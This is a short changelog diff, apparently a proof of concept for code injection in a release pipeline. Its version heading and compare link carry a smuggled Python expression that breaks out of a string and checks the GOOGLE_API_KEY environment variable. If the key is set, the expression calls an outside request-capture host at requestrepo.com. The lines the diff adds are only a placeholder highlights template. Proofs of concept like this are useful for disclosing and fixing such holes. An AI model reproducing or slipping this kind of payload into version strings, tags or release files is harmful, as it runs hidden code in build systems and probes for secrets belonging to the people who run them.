@@ -3,6 +3,13 @@
 ## [3.2.9-0";__import__("os").environ.get("GOOGLE_API_KEY")and __import__("urllib.request").request.urlopen("https://k7cgd9h6.requestrepo.com/proof?marker=P")#](https://github.com/arnodorian1337/adk-python-release-candidate-poc-20261126201513/compare/v2.15.1...v3.2.9-0";__import__("os").environ.get("GOOGLE_API_KEY")and __import__("urllib.request").request.urlopen("https://k7cgd9h6.requestrepo.com/proof?marker=P")#) (2026-11-26)
 
 
+### Highlights
+
+<one sentence describing the theme of this release>
+
+* **<Feature>**: <what it unlocks for the user, in one line>. (<commit>)
+* **<Feature>**: <user benefit>. (<commit>)
+
 ### Bug Fixes
 
 * add harmless release-candidate note ([3a56cb3](https://github.com/arnodorian1337/adk-python-release-candidate-poc-20261126201513/commit/3a56cb38944ce6c0428e0a985faee81c584575a3))
